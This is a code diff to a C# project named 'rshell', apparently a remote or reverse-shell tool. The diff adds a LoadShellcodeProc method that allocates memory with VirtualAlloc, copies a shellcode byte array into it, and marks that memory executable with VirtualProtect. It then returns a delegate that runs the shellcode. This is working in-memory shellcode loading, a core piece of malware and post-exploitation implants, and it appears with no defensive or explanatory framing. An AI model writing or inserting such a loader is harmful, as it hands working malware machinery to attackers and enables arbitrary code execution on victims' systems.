@@ -10,6 +10,8 @@ using System.Threading;
 using System.Diagnostics;
 using System.Security.Principal;
 using System.Reflection;
+using System.Runtime.InteropServices;
+using System.ComponentModel;
 
 namespace rshell 
 { 
@@ -458,6 +460,35 @@ class Utils
         {
             var fileInfo = new FileInfo(Assembly.GetExecutingAssembly().Location);
             return fileInfo.DirectoryName;
+        }
+        /// <summary>
+        /// Load shellcode into memory and return a delegate 
+        /// </summary>
+        /// <typeparam name="T"></typeparam>
+        /// <param name="shellcode"></param>
+        /// <param name="address"></param>
+        /// <param name="size"></param>
+        /// <returns></returns>
+        /// <exception cref="Win32Exception"></exception>
+        public static T LoadShellcodeProc<T>(byte[] shellcode, out IntPtr address, out ulong size)
+        {
+            // allocate memory for shellcode
+            IntPtr _address = WinAPI.VirtualAlloc(IntPtr.Zero, (ulong)shellcode.Length, WinAPI.AllocationType.Commit, WinAPI.MemoryProtection.ReadWrite);
+            if (_address == IntPtr.Zero) goto ERROR;
+
+            // copy shellcode to unmanaged memory
+            Marshal.Copy(shellcode, 0, _address, shellcode.Length);
+
+            // change memory protection to allow code execution
+            if (!WinAPI.VirtualProtect(_address, (ulong)shellcode.Length, WinAPI.MemoryProtection.ExecuteRead, out _))
+                goto ERROR;
+
+            address = _address;
+            size = (ulong)shellcode.Length;
+            return Marshal.GetDelegateForFunctionPointer<T>(_address);
+
+        ERROR:
+            throw new Win32Exception();
         }
     }
 }
